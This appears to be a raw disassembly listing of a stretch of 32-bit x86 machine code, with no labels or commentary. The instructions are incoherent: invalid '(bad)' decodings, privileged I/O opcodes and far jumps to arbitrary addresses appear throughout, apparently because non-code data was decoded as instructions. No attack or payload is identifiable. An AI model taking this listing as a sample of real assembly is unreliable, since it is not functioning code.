  41859d:	xor    esi,esp
  41859f:	addr16 xchg esp,eax
  4185a1:	arpl   WORD PTR [edi],dx
  4185a3:	push   eax
  4185a4:	mov    eax,0xedacbd1
  4185a9:	sti    
  4185aa:	adc    DWORD PTR [ecx-0x7],0x6f820fc4
  4185b1:	leave  
  4185b2:	jl     0x418560
  4185b4:	lahf   
  4185b5:	loop   0x418608
  4185b7:	push   ds
  4185b8:	jl     0x418623
  4185ba:	inc    eax
  4185bb:	add    bl,BYTE PTR [edx+0x35]
  4185be:	stc    
  4185bf:	pop    edi
  4185c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c1:	stos   DWORD PTR es:[edi],eax
  4185c2:	adc    eax,0x388a7442
  4185c7:	jl     0x4185ae
  4185c9:	mov    al,0xb3
  4185cb:	lds    eax,FWORD PTR [edi-0x2797cdb2]
  4185d1:	jmp    0x4ffa:0x14d98fab
  4185d8:	or     edx,edx
  4185da:	pop    ss
  4185db:	mov    al,ds:0xbb5fd4e8
  4185e0:	mov    esi,DWORD PTR [ebx-0x347bb6b9]
  4185e6:	into   
  4185e7:	mov    bh,0x3d
  4185e9:	xor    eax,esp
  4185eb:	test   DWORD PTR [ebx+0x2b45ca2f],edx
  4185f1:	rcr    ecx,cl
  4185f3:	ret    
  4185f4:	fiadd  WORD PTR ds:[ebx+0x53]
  4185f8:	or     ah,BYTE PTR [eax-0x5021999c]
  4185fe:	and    dh,dh
  418600:	jbe    0x4185db
  418602:	rcl    BYTE PTR [ebx],cl
  418604:	pop    edi
  418605:	inc    al
  418607:	rol    DWORD PTR [ebx+0xe5b4a20],cl
  41860d:	js     0x41864b
  41860f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418610:	pop    es
  418611:	dec    edi
  418612:	mov    es,WORD PTR [ecx-0x18ac9357]
  418618:	cld    
  418619:	sub    eax,0xd8b61d32
  41861e:	hlt    
  41861f:	and    al,0x75
  418621:	cmp    al,0xb9
  418623:	inc    edx
  418624:	add    al,0x2f
  418626:	pop    ebp
  418627:	push   ds
  418628:	and    esp,DWORD PTR [ebp-0x4]
  41862b:	sti    
  41862c:	jmp    0x684b:0x93b9d600
  418633:	pop    es
  418634:	fs int 0x19
  418637:	add    esp,DWORD PTR ds:0xd143803c
  41863d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41863e:	jmp    0x418631
  418640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418642:	stos   DWORD PTR es:[edi],eax
  418643:	jnp    0x41864f
  418645:	jne    0x41865e
  418647:	ds aaa 
  418649:	ret    
  41864a:	mov    esp,0xaafac8bd
  41864f:	push   0x8600bcd7
  418654:	fmul   st,st(3)
  418656:	jbe    0x418607
  418658:	rcl    DWORD PTR [edx+eax*8+0x2187385b],cl
  41865f:	loop   0x418613
  418661:	test   DWORD PTR [eax+0x29],edx
  418664:	mov    edx,0xbe2b88c2
  418669:	hlt    
  41866a:	(bad)  
  41866b:	icebp  
  41866c:	in     eax,0xc6
  41866e:	pop    edi
  41866f:	dec    eax
  418670:	adc    edi,eax
  418672:	lds    esi,FWORD PTR ds:0xde08d353
  418678:	test   BYTE PTR [ebx-0x5c60ca45],0xfd
  41867f:	scas   al,BYTE PTR es:[edi]
  418680:	sub    eax,DWORD PTR [eax+0x3ffc154b]
  418686:	jbe    0x41869c
  418688:	fwait
  418689:	ins    DWORD PTR es:[edi],dx
  41868a:	mov    edi,0xfd8e0026
  41868f:	js     0x4186cb
  418691:	push   ecx
  418692:	add    DWORD PTR [ecx-0x9d635c9],ebp
  418698:	or     cl,BYTE PTR [esi+0x50]
  41869b:	push   esi
  41869c:	arpl   WORD PTR [eax-0x61],bp
  41869f:	inc    esp
  4186a0:	out    dx,eax
  4186a1:	cli    
  4186a2:	pop    ebx
  4186a3:	mov    bl,0xd8
  4186a5:	sbb    al,0x91
  4186a7:	inc    esp
  4186a8:	pushf  
  4186a9:	scas   al,BYTE PTR es:[edi]
  4186aa:	imul   esi,esp,0xffffffa5
  4186ad:	lock test DWORD PTR [eax-0x4b895a2e],esi
  4186b4:	mov    dh,0x33
  4186b6:	pop    ebx
  4186b7:	or     edi,DWORD PTR [eax]
  4186b9:	sbb    ecx,ecx
  4186bb:	in     al,0xd2
  4186bd:	std    
  4186be:	fcomp  QWORD PTR [ecx]
  4186c0:	push   edx
  4186c1:	xor    esi,DWORD PTR [esi+0x5a82545b]
  4186c7:	cmp    ebx,ebp
  4186c9:	popa   
  4186ca:	cld    
  4186cb:	sbb    DWORD PTR [edi+ecx*1-0x25],ebp
  4186cf:	fld    st(2)
  4186d1:	cmp    dl,ch
  4186d3:	lahf   
  4186d4:	imul   edx,DWORD PTR [ecx-0x23],0xffffffd0
  4186d8:	or     dl,ch
  4186da:	mov    al,dh
  4186dc:	imul   edi,DWORD PTR [edx],0x5e
  4186df:	sbb    cl,bh
  4186e1:	dec    edi
  4186e3:	dec    esi
  4186e4:	xchg   ebx,eax
  4186e5:	cmp    al,0x86
  4186e7:	outs   dx,BYTE PTR ds:[esi]
  4186e8:	ja     0x41875e
  4186ea:	rcr    BYTE PTR [ecx+edi*4-0x7e],0x92
  4186ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186f0:	and    ah,al
  4186f2:	psubusw mm2,QWORD PTR [ebx+0x2a]
  4186f6:	out    dx,al
  4186f7:	(bad)  
  4186f9:	cli    
  4186fa:	or     ecx,ebx
  4186fc:	je     0x418760
  4186fe:	retf   
  4186ff:	dec    esi
  418700:	mov    cl,0x79
  418702:	jbe    0x4186b6
  418704:	jg     0x418691
  418706:	xor    bh,dh
  418708:	pop    ebx
  418709:	mov    edi,0xd1ebf43d
  41870e:	mov    eax,0x93febc4f
  418713:	add    al,0xfd
  418715:	ja     0x4186b9
  418717:	retf   0xe1c8
  41871a:	sbb    DWORD PTR [edx],eax
  41871c:	jmp    FWORD PTR [edi+ebp*8-0x73]
  418720:	cmp    BYTE PTR [edx+0x24],dl
  418723:	push   ebp
  418724:	les    di,DWORD PTR [ecx+0x17]
  418728:	sbb    esp,DWORD PTR [edi-0x23]
  41872b:	cmp    al,0x20
  41872d:	sbb    eax,0x91a6e5b5
  418732:	cmp    ax,0xd3f0
  418736:	xlat   BYTE PTR ds:[ebx]
  418737:	test   BYTE PTR [ecx+0x5c007349],ch
  41873d:	ror    BYTE PTR [ebp-0x14af995d],cl
  418743:	stos   BYTE PTR es:[edi],al
  418744:	sti    
  418745:	sbb    BYTE PTR [ecx],al
  418747:	lds    edx,FWORD PTR [esi]
  418749:	sti    
  41874a:	cs aad 0xe8
  41874d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41874e:	mov    bl,0x73
  418750:	dec    ebx
  418751:	leave  
  418752:	jg     0x41876e
  418754:	pushf  
  418755:	cmp    ch,BYTE PTR [esi-0x12bb1447]
  41875b:	call   0x57a69234
  418760:	test   BYTE PTR [ebx+ebp*2-0x2e],ch
  418764:	pop    es
  418765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418766:	ret    
  418767:	dec    esp
  418768:	jp     0x418752
  41876a:	nop
  41876b:	(bad)  
  41876c:	xchg   ecx,eax
  41876d:	and    al,0x63
  41876f:	sub    eax,0x161567f0
  418774:	xor    eax,0x7a2b4689
  418779:	jge    0x4187c4
  41877b:	sbb    eax,0xd76ada01
  418780:	pop    ss
  418781:	dec    BYTE PTR [edx-0xb]
  418784:	icebp  
  418785:	test   ecx,0xbda78a07
  41878b:	(bad)  
  41878c:	(bad)  
  41878d:	daa    
  41878e:	(bad)  
  41878f:	cmp    dl,BYTE PTR [esi+0x14]
  418792:	adc    esp,ecx
  418794:	dec    ebx
  418795:	je     0x4187ad
  418797:	shl    BYTE PTR [ecx],cl
  418799:	jnp    0x4187a0
  41879b:	and    esp,ecx
  41879d:	add    al,0x96
  41879f:	gs push edi
  4187a1:	repnz rol DWORD PTR [eax],cl
  4187a4:	enter  0xbcb6,0x6c
  4187a8:	cli    
  4187a9:	stos   BYTE PTR es:[edi],al
  4187aa:	cmp    esi,DWORD PTR [ebx-0x7d619818]
  4187b0:	xchg   ebx,eax
  4187b1:	int3   
  4187b2:	out    0x5,al
  4187b4:	adc    edi,DWORD PTR [edi-0x311199f]
  4187ba:	jle    0x4187f7
  4187bc:	inc    esi
  4187bd:	xor    WORD PTR [edx],ax
  4187c0:	in     al,dx
  4187c1:	jnp    0x41876d
  4187c3:	and    edx,ecx
  4187c5:	adc    edi,DWORD PTR [ecx]
  4187c7:	mov    DWORD PTR [ebx],esp
  4187c9:	pop    ecx
  4187ca:	xor    BYTE PTR [ebp-0x15],0x71
  4187ce:	mov    ?,ecx
  4187d0:	lds    edx,FWORD PTR [ebx]
  4187d2:	inc    ebp
  4187d3:	div    ch
  4187d5:	test   al,bl
  4187d7:	push   eax
  4187d8:	dec    edi
  4187d9:	dec    ebx
  4187da:	or     DWORD PTR [edi-0x2a],esp
  4187dd:	adc    BYTE PTR [edx+esi*4+0x2],ah
  4187e1:	fwait
  4187e2:	jecxz  0x4187ee
  4187e4:	shr    DWORD PTR [esi-0x5d],1
  4187e7:	mov    dh,0x98
  4187e9:	sbb    BYTE PTR [ecx+0x6fd072b7],0x62
  4187f0:	pop    edi
  4187f1:	ret    0xd48c
  4187f4:	js     0x4187e2
  4187f6:	sub    DWORD PTR [esi-0x3044a124],ecx
  4187fc:	sbb    bl,al
  4187fe:	push   ebx
  4187ff:	add    BYTE PTR [edx+0x56f5a6e3],0x77
  418806:	(bad)  [edx]
  418808:	mov    ch,0xc5
  41880a:	bound  eax,QWORD PTR [ecx-0x3b]
  41880d:	icebp  
  41880e:	repnz xor ah,BYTE PTR [ebx-0x3aca8dd7]
  418815:	int    0x84
  418817:	xchg   esi,eax
  418818:	outs   dx,DWORD PTR ds:[esi]
  418819:	inc    ebp
  41881a:	stc    
  41881b:	(bad)  
  41881c:	and    DWORD PTR [eax+0x7e],ecx
  41881f:	jmp    0xa513e59f
  418824:	mov    al,gs:0x8b6f4231
  41882a:	daa    
  41882b:	jmp    0x3f1a:0xb4824ffa
  418832:	nop
  418833:	lahf   
  418834:	outs   dx,BYTE PTR ds:[esi]
  418835:	xor    BYTE PTR [esi+0x30c9b935],0xf5
  41883c:	ja     0x41881e
  41883e:	scas   eax,DWORD PTR es:[edi]
  41883f:	call   0x59ed:0xc75b7e17
  418846:	vmwrite ebx,DWORD PTR [edi+ebp*4-0x708af7af]
  41884e:	imul   esp,DWORD PTR [ebp-0x352e6074],0x25fbf6c
  418858:	stos   DWORD PTR es:[edi],eax
  418859:	inc    ebx
  41885a:	and    ebp,DWORD PTR [ebx]
  41885c:	and    al,0x5
  41885e:	or     al,0x52
  418860:	xor    bl,dl
  418862:	lods   eax,DWORD PTR ds:[esi]
  418863:	mov    BYTE PTR [edx-0x75],bh
  418866:	shl    BYTE PTR [edx],1
  418868:	mov    ah,0xa8
  41886a:	pop    ecx
  41886b:	add    BYTE PTR ds:0xc66d8dc0,ah
  418871:	or     BYTE PTR [ebx-0x5eceb6b8],0xc
  418878:	pop    ds
  418879:	pop    edx
  41887a:	ds jne 0x4188ef
  41887d:	dec    ebx
  41887e:	pop    ebx
  41887f:	sub    bh,BYTE PTR [ebx+0x2d]
  418882:	dec    esi
  418883:	xor    BYTE PTR [ebp-0x3d],bh
  418886:	pop    edx
  418887:	xor    edx,DWORD PTR [ebp+0x74965435]
  41888d:	daa    
  41888e:	adc    al,0x73
  418890:	fcomp  QWORD PTR gs:[ecx]
  418893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418894:	mov    bh,0xdb
  418896:	xchg   ebp,eax
  418897:	cmp    al,0x61
  418899:	adc    DWORD PTR [esi+0x4],esi
  41889c:	inc    ebp
  41889d:	ss das 
  41889f:	add    edi,DWORD PTR ds:0x5223dc47
  4188a5:	js     0x418851
  4188a7:	inc    edx
  4188a8:	repnz push ss
  4188aa:	iret   
  4188ab:	dec    eax
  4188ac:	mov    ch,0x75
  4188ae:	or     al,0xf8
  4188b0:	sbb    DWORD PTR [esp+ebx*4],0xdeb408d0
  4188b7:	cmp    al,0x29
  4188b9:	jo     0x418894
  4188bb:	out    0x67,al
  4188bd:	fst    st(3)
  4188bf:	mov    DWORD PTR [esi+0x61],edi
  4188c2:	repz cmp ecx,DWORD PTR [ecx]
  4188c5:	test   BYTE PTR [edx],ch
  4188c7:	aaa    
  4188c8:	or     eax,0xd553e629
  4188cd:	add    al,0x55
  4188cf:	in     eax,dx
  4188d0:	pop    edi
  4188d1:	push   edi
  4188d2:	cmp    DWORD PTR [esi],ebp
  4188d4:	leave  
  4188d5:	pushf  
  4188d6:	int3   
  4188d7:	popf   
  4188d8:	stc    
  4188d9:	test   BYTE PTR [ebp+0x20],ah
  4188dc:	scas   al,BYTE PTR es:[edi]
  4188dd:	xchg   esi,eax
  4188de:	js     0x418867
  4188e0:	mov    ds:0xbffb41cb,eax
  4188e5:	(bad)  
  4188e6:	in     al,dx
  4188e7:	jle    0x41890f
  4188e9:	(bad)  
  4188ea:	call   DWORD PTR [ebp-0x1]
  4188ed:	sbb    dl,dl
  4188ef:	lods   al,BYTE PTR ds:[esi]
  4188f0:	imul   ebp,DWORD PTR [edx-0x225d7738],0xffffffee
  4188f7:	fisttp WORD PTR [ebp+0xc4b693e]
  4188fd:	out    0x15,eax
  4188ff:	cdq    
  418900:	ins    BYTE PTR es:[edi],dx
  418901:	xor    DWORD PTR [eax],0xffffff8a
  418904:	fist   DWORD PTR [ebp+0x2591ae01]
  41890a:	aaa    
  41890b:	clc    
  41890c:	inc    ebp
  41890d:	loopne 0x4188fd
  41890f:	xor    eax,0x35620c0
  418914:	push   edi
  418915:	sub    al,0x12
  418917:	and    al,0x88
  418919:	popa   
  41891a:	push   ebx
  41891b:	mov    esi,0x3bad029f
  418920:	leave  
  418921:	test   bh,ch
  418923:	push   0x1c8fee4c
  418928:	mov    ds:0x4f5f903b,eax
  41892d:	sub    eax,0x83c14f59
  418932:	xor    bl,BYTE PTR [esi-0x6b]
  418935:	in     eax,dx
  418936:	mov    gs:0x95abb824,al
  41893c:	xlat   BYTE PTR ds:[ebx]
  41893d:	pop    edx
  41893e:	ds ja  0x418911
  418941:	fwait
  418942:	sub    DWORD PTR [esi-0x3f],esi
  418945:	and    BYTE PTR [edx],al
  418947:	and    eax,0xa234219a
  41894c:	xor    eax,0x76ffed32
  418951:	xor    DWORD PTR [esi],ebp
  418953:	inc    edi
  418954:	jmp    0x8c3b4041
  418959:	and    eax,0xd5db5c87
  41895e:	mov    bl,0x9e
  418960:	cdq    
  418961:	in     eax,dx
  418962:	pop    ecx
  418963:	pop    edx
  418964:	add    eax,eax
  418966:	xchg   ecx,eax
  418967:	stos   DWORD PTR es:[edi],eax
  418968:	jge    0x418905
  41896a:	popa   
  41896b:	or     cl,dl
  41896d:	sbb    dl,al
  41896f:	aas    
  418970:	dec    eax
  418971:	int    0xb9
  418973:	stos   DWORD PTR es:[edi],eax
  418974:	or     bl,BYTE PTR [ecx-0x5f]
  418977:	outs   dx,BYTE PTR ds:[esi]
  418978:	jne    0x4189a2
  41897a:	loopne 0x418979
  41897c:	in     eax,dx
  41897d:	lock mov edi,0x98885ee6
  418983:	dec    edi
  418984:	mov    dl,0xa2
  418986:	push   es
  418987:	ret    
  418988:	ins    BYTE PTR es:[edi],dx
  418989:	gs cli 
  41898b:	jecxz  0x418947
  41898d:	cs inc edx
  41898f:	gs in  eax,0x39
  418992:	jecxz  0x41897d
  418994:	(bad)
  418997:	mov    eax,ds:0xbe6e0e1d
  41899c:	loop   0x418a02
  41899e:	inc    ebp
  41899f:	imul   BYTE PTR [ecx-0x6c]
  4189a2:	cwde   
  4189a3:	ror    DWORD PTR [edx],cl
  4189a5:	out    dx,al
  4189a6:	mov    ebp,0xa6a86b51
  4189ab:	stos   DWORD PTR es:[edi],eax
  4189ac:	jae    0x418935
  4189ae:	jecxz  0x418961
  4189b0:	sub    eax,0x45dffbe4
  4189b5:	cmp    BYTE PTR [ebp+0x339f5f71],ch
  4189bb:	scas   eax,DWORD PTR es:[edi]
  4189bc:	scas   eax,DWORD PTR es:[edi]
  4189bd:	icebp  
  4189be:	rcl    DWORD PTR [ecx],1
  4189c0:	aad    0x10
  4189c2:	retf   0xad2a
  4189c5:	ins    BYTE PTR es:[edi],dx
  4189c6:	push   cs
  4189c7:	loop   0x4189e1
  4189c9:	and    DWORD PTR [ebx],edx
  4189cb:	push   edx
  4189cc:	out    dx,al
  4189cd:	lar    ebp,WORD PTR [edx+edi*1]
  4189d1:	sub    DWORD PTR [edi+0xf],edi
  4189d4:	jecxz  0x418963
  4189d6:	out    dx,eax
  4189d7:	dec    esp
  4189d8:	sti    
  4189d9:	dec    edx
  4189da:	inc    edi
  4189db:	push   cs
  4189dc:	pop    esp
  4189dd:	hlt    
  4189de:	xor    eax,0xef61eb46
  4189e3:	sti    
  4189e4:	mov    dh,0x39
  4189e6:	fnstcw WORD PTR [esi+ebx*2+0x41]
  4189ea:	or     edx,DWORD PTR [ecx]
  4189ec:	mov    cl,0x25
  4189ee:	push   eax
  4189ef:	and    ebx,eax
  4189f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189f2:	outs   dx,BYTE PTR ds:[esi]
  4189f3:	mov    al,ds:0x1a769e2a
  4189f8:	scas   al,BYTE PTR es:[edi]
  4189f9:	call   0x2676:0x94735dab
  418a00:	xor    DWORD PTR [ebx+0x33],esp
  418a03:	sahf   
  418a04:	rcr    DWORD PTR [ecx-0x5865f11f],1
  418a0a:	mov    bh,ah
  418a0c:	repz mov edx,0x43f4d10
  418a12:	icebp  
  418a13:	and    eax,0x8bf268a2
  418a18:	shr    DWORD PTR [edi+ebx*4-0x7c404791],0x7a
  418a20:	repnz cmp al,0xb2
  418a23:	shr    edx,1
  418a25:	es mov edx,0x72b24336
  418a2b:	or     edx,DWORD PTR [edi+0x2582848]
  418a31:	push   eax
  418a32:	loope  0x418a05
  418a34:	push   esi
  418a35:	ret    0x7727
  418a38:	xchg   ebx,eax
  418a39:	sub    al,0x76
  418a3b:	ins    BYTE PTR es:[edi],dx
  418a3c:	inc    esi
  418a3d:	scas   eax,DWORD PTR es:[edi]
  418a3e:	ret    
  418a3f:	adc    ch,BYTE PTR [esi+0x2d21ff24]
  418a45:	into   
  418a46:	inc    eax
  418a47:	cmp    al,0x38
  418a49:	mov    eax,0xac444c86
  418a4e:	leave  
  418a4f:	scas   al,BYTE PTR es:[edi]
  418a50:	jne    0x418a98
  418a52:	adc    dl,al
  418a54:	je     0x418ad3
  418a56:	(bad)  
  418a57:	mov    ebx,0x47b15165
  418a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5d:	ficomp DWORD PTR [eax]
  418a5f:	lods   eax,DWORD PTR ds:[esi]
  418a60:	(bad)  
  418a61:	pop    ecx
  418a62:	mov    bl,0x3e
  418a64:	inc    ecx
  418a65:	loopne 0x418a18
  418a67:	call   0x4d39:0x4ef9ced0
  418a6e:	push   0x4a
  418a70:	xor    DWORD PTR [edi+0x665d1aab],eax
  418a76:	ins    BYTE PTR es:[edi],dx
  418a77:	ds pop esi
  418a79:	sbb    eax,DWORD PTR [edi+0xc509bb8]
  418a7f:	jno    0x418a9e
  418a81:	mov    BYTE PTR [ebx+0x5b],bl
  418a84:	shl    ebx,1
  418a86:	mov    ds:0xbc88fe83,al
  418a8b:	sar    BYTE PTR [ebp-0x491b13e2],cl
  418a91:	or     eax,0xdf2f625e
  418a96:	xchg   ebp,eax
  418a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a98:	adc    esp,ebx
  418a9a:	dec    di
  418a9c:	add    al,0x15
  418a9e:	hlt    
  418a9f:	call   DWORD PTR [eax+ebx*2+0x7eefd91e]
  418aa6:	(bad)  
  418aa7:	jecxz  0x418a44
  418aa9:	pop    esp
  418aaa:	sub    DWORD PTR [esi],edi
  418aac:	fbstp  TBYTE PTR [ecx+0x33]
  418aaf:	cmp    DWORD PTR [edi],esi
  418ab1:	or     eax,0xeadd516e
  418ab6:	lock ins BYTE PTR es:[edi],dx
  418ab8:	inc    eax
  418ab9:	jmp    0xa544:0x48d3a02f
  418ac0:	test   al,0x64
  418ac2:	mov    WORD PTR [edx-0x61cc57a7],ss
  418ac8:	lock ins DWORD PTR es:[edi],dx
  418aca:	test   al,0x1b
  418acc:	repz shl DWORD PTR [ecx-0x4430d69e],1
  418ad3:	xchg   ebp,eax
  418ad4:	repz jns 0x418b35
  418ad7:	(bad)  
  418ad8:	push   eax
  418ad9:	mov    edx,DWORD PTR [eax]
  418adb:	cld    
  418adc:	jg     0x418a81
  418ade:	(bad)  
  418adf:	lahf   
  418ae0:	out    0xb6,al
  418ae2:	and    ebx,esp
  418ae4:	jmp    0x3e18:0x25a075e3
  418aeb:	mov    edi,0x21a7a393
  418af0:	mov    ah,0x32
  418af2:	fisub  DWORD PTR [edx]
  418af4:	in     al,0xb3
  418af6:	jns    0x418a98
  418af8:	int3   
  418af9:	mov    al,0x90
  418afb:	inc    ebp
  418afc:	push   ebp
  418afd:	int    0xd3
  418aff:	(bad)  
  418b00:	je     0x418abf
  418b02:	aaa    
  418b03:	mov    DWORD PTR [ebx+eiz*4],ecx
  418b06:	retf   0x151c
  418b09:	das    
  418b0a:	lods   al,BYTE PTR ds:[esi]
  418b0b:	lock clc 
  418b0d:	aaa    
  418b0e:	mov    ecx,DWORD PTR [esi+0x2fb1a0ff]
  418b14:	popf   
  418b15:	mov    ch,0x39
  418b17:	jle    0x418ac0
  418b19:	hlt    
  418b1a:	and    ebx,DWORD PTR [ebx-0x44]
  418b1d:	stos   DWORD PTR es:[edi],eax
  418b1e:	fst    DWORD PTR [ebx+0x74]
  418b21:	and    dl,BYTE PTR [edi+0x5]
  418b24:	or     BYTE PTR [edi+0x7c6b4efc],dh
  418b2a:	pop    ecx
  418b2b:	mov    bl,0xa9
  418b2d:	out    dx,eax
  418b2e:	rol    DWORD PTR [ebp+0x570df3de],1
  418b34:	test   BYTE PTR [ebx],0x50
  418b37:	dec    ebx
  418b38:	inc    edx
  418b39:	and    DWORD PTR [ecx+0x49f513cc],ecx
  418b3f:	add    DWORD PTR [eax+0x7835bbae],edx
  418b45:	test   al,0x7e
  418b47:	int    0x2c
  418b49:	inc    edx
  418b4a:	add    ebp,DWORD PTR [ebx-0x63]
  418b4d:	push   edx
  418b4e:	adc    ebp,DWORD PTR [ebp-0xf760cc0]
  418b54:	dec    esi
  418b55:	(bad)  
  418b56:	rol    bh,0xa0
  418b59:	xor    al,0xea
  418b5b:	into   
  418b5c:	and    DWORD PTR [ebx-0x5837d1a8],ecx
  418b62:	stc    
  418b63:	pop    es
  418b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b65:	sti    
  418b66:	and    al,0x58
  418b68:	lock sub eax,0x21d82ff9
  418b6e:	test   DWORD PTR [edi+0x49],0xaead42f6
  418b75:	mov    edx,0x142d9ad6
  418b7a:	ror    DWORD PTR [esi],1
  418b7c:	aad    0xda
  418b7e:	js     0x418bea
  418b80:	push   edx
  418b81:	mov    dh,0xa7
  418b83:	sbb    DWORD PTR [ebx+edx*8-0x4e0f1ea2],ecx
  418b8a:	xlat   BYTE PTR ds:[ebx]
  418b8b:	dec    esp
  418b8d:	sahf   
  418b8e:	sub    DWORD PTR [edi+0x40],0xd8e2d867
  418b95:	mov    cl,0x28
  418b97:	cmp    al,0xbb
  418b99:	and    eax,0x306e3eb2
  418b9e:	mov    ebp,0x9dc2597a
  418ba3:	popf   
  418ba4:	repz jp 0x418b9f
  418ba7:	call   0xb3d827d
  418bac:	pop    ds
  418bad:	mov    bh,0xd7
  418baf:	add    eax,eax
  418bb1:	or     BYTE PTR [ebp-0x6b],ah
  418bb4:	stos   BYTE PTR es:[edi],al
  418bb5:	ds addr16 std 
  418bb8:	cs jmp 0xe77d:0x5e44a0c
  418bc0:	cli    
  418bc1:	sub    BYTE PTR ss:[eax-0x27df6791],cl
  418bc8:	jno    0x418b69
  418bca:	ret    0xe1c
  418bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bce:	sub    eax,0xd70662cc
  418bd3:	sbb    al,0xbb
  418bd5:	fistp  WORD PTR [edi+0x7]
  418bd8:	push   ecx
  418bd9:	retf   
  418bda:	mov    al,0x8c
  418bdc:	das    
  418bdd:	pop    edi
  418bde:	inc    ecx
  418bdf:	push   esi
  418be0:	les    eax,FWORD PTR [esi-0x70]
  418be3:	pusha  
  418be4:	int    0xd0
  418be6:	and    DWORD PTR [edi],edi
  418be8:	sbb    eax,0x57614ee6
  418bed:	pop    ecx
  418bee:	mov    ch,0x85
  418bf0:	and    ebx,DWORD PTR [eax]
  418bf2:	xor    esp,0xfffffffb
  418bf5:	push   cs
  418bf6:	stc    
  418bf7:	mov    esp,DWORD PTR [esi+0x4202a7f1]
  418bfd:	call   0x86fdd847
  418c02:	ret    
  418c03:	jnp    0x418bce
  418c05:	or     DWORD PTR [edx],ebp
  418c07:	ret    
  418c08:	test   al,0x3a
  418c0a:	imul   esp,DWORD PTR [esi+0xd],0xfffffffc
  418c0e:	fcom   QWORD PTR [esi]
  418c10:	das    
  418c11:	pusha  
  418c12:	(bad)  
  418c13:	cmp    esp,eax
  418c15:	je     0x418c2b
  418c17:	popa   
  418c18:	cmp    DWORD PTR [ebx-0x10ddd6a],ebp
  418c1e:	pop    ebx
  418c1f:	mov    esp,DWORD PTR [eax-0x2e]
  418c22:	clc    
  418c23:	cwde   
  418c24:	mov    esp,DWORD PTR [ecx+ebp*8-0x5cc60c30]
  418c2b:	push   DWORD PTR [ebx-0x4b]
  418c2e:	mov    al,ds:0xd6209a3b
  418c33:	pop    edi
  418c34:	and    al,0xa7
  418c36:	jbe    0x418be6
  418c38:	xchg   DWORD PTR [edi-0x3b6f6d05],edx
  418c3e:	cdq    
  418c3f:	sub    DWORD PTR [ebx+0x77],edx
  418c42:	xlat   BYTE PTR ds:[ebx]
  418c43:	mul    BYTE PTR [ebp-0x61df98be]
  418c49:	imul   ebp,DWORD PTR [ebp-0x5c],0x61
  418c4d:	xor    ah,bl
  418c4f:	into   
  418c50:	sub    eax,eax
  418c52:	adc    al,0xf5
  418c54:	cmp    BYTE PTR [edx],0x4
  418c57:	pop    ecx
  418c58:	(bad)  [ecx-0x4fd44d73]
  418c5e:	mov    ds:0xf1ddfda5,al
  418c63:	mov    dl,0xc7
  418c65:	aaa    
  418c66:	cmc    
  418c67:	inc    edi
  418c68:	call   0xc17b74a9
  418c6d:	xchg   DWORD PTR [eax],ebp
  418c6f:	(bad)  
  418c70:	leave  
  418c71:	repnz (bad) 
  418c75:	ret    0x816c
  418c78:	cmp    eax,0x1e43c8f
  418c7d:	scas   eax,DWORD PTR es:[edi]
  418c7e:	pusha  
  418c7f:	dec    BYTE PTR [eax]
  418c81:	lahf   
  418c82:	(bad)  
  418c83:	fimul  WORD PTR [ebx]
  418c85:	pop    ecx
  418c86:	lahf   
  418c87:	push   ds
  418c88:	or     eax,0x22a79e83
  418c8d:	(bad)  
  418c8e:	mov    al,ds:0xd91f111b
  418c93:	scas   eax,DWORD PTR es:[edi]
  418c94:	pusha  
  418c95:	mov    ecx,0xf9761c48
  418c9a:	and    BYTE PTR [edx-0x758139a2],0x5c
  418ca1:	icebp  
  418ca2:	sti    
  418ca3:	mov    BYTE PTR [edx+0x48644bf5],ah
  418ca9:	cmp    ebp,DWORD PTR [esp+ecx*1]
  418cac:	loop   0x418c91
  418cae:	int3   
  418caf:	jmp    DWORD PTR [edi]
  418cb1:	cmp    edi,DWORD PTR [ecx-0xfc20d65]
  418cb7:	push   edi
  418cb8:	and    ebx,DWORD PTR [esi]
  418cba:	out    0x18,al
  418cbc:	scas   eax,DWORD PTR es:[edi]
  418cbd:	test   eax,0x177bb8a4
  418cc2:	into   
  418cc3:	adc    eax,0x2c6e043d
  418cc8:	mov    ah,dl
  418cca:	xor    BYTE PTR [esi],ah
  418ccc:	fdiv   QWORD PTR [ecx]
  418cce:	repnz adc dl,bl
  418cd1:	aas    
  418cd2:	and    al,0xf0
  418cd4:	fsubr  QWORD PTR [edi+0x3b]
  418cd7:	in     al,dx
  418cd8:	test   al,0x9e
  418cda:	sub    BYTE PTR [ebp+0x6ddaa5ed],dh
  418ce0:	std    
  418ce1:	aas    
  418ce2:	jmp    0x3126:0x10fc4fe1
  418ce9:	in     eax,0x85
  418ceb:	pop    es
  418cec:	add    cl,BYTE PTR [esi]
  418cee:	xchg   ebx,eax
  418cef:	pop    es
  418cf0:	inc    ecx
  418cf1:	call   0xc043531b
  418cf6:	jge    0x418d6e
  418cf8:	lock mov ds:0x84b90a5e,eax
  418cfe:	add    al,0xee
  418d00:	pop    ss
  418d01:	inc    esp
  418d02:	adc    al,0xcc
  418d04:	inc    edx
  418d05:	cwde   
  418d06:	mov    ds:0x9bf2214,eax
  418d0b:	out    dx,al
  418d0c:	in     eax,0x3c
  418d0e:	mov    ecx,0x12875bf1
  418d13:	enter  0xbffd,0x6a
  418d17:	or     ecx,DWORD PTR [ebp+0x700cbb87]
  418d1d:	adc    al,0xbb
  418d1f:	inc    esp
  418d20:	push   edx
  418d21:	in     eax,0xfc
  418d23:	jmp    0xaf267cec
  418d28:	pop    ds
  418d29:	and    DWORD PTR [ecx+0x53],edx
  418d2c:	inc    edi
  418d2d:	add    ah,dh
  418d2f:	xor    BYTE PTR [ebx-0x74bfd611],dh
  418d35:	fcomp  st(4)
  418d37:	push   cs
  418d38:	xchg   ecx,eax
  418d39:	or     ebx,ebp
